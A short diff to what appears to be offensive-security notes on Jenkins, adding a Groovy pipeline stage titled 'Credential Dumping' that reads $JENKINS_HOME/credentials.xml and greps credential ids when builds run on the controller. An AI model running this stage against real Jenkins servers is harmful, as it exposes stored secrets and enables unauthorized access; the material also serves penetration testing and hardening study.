@@ -53,6 +53,15 @@ stage('Credential Dumping') {
 - We can either look through the code repository hunting for these id or we need a piece of luck we can use Built-In executor
 - When ```# of exectors``` in ```Configure System``` is set to non-zero, we can run builds on the controller, which means we have access to the controllers file system.
 
+``` Groovy
+        stage('Credential Dumping') {
+            steps {
+                 sh '''
+                   cat $JENKINS_HOME/credentials.xml | grep "<id>"
+                 '''
+            }
+        }
+```
 ## Credentials Dumping from Script Console
 
 ## References
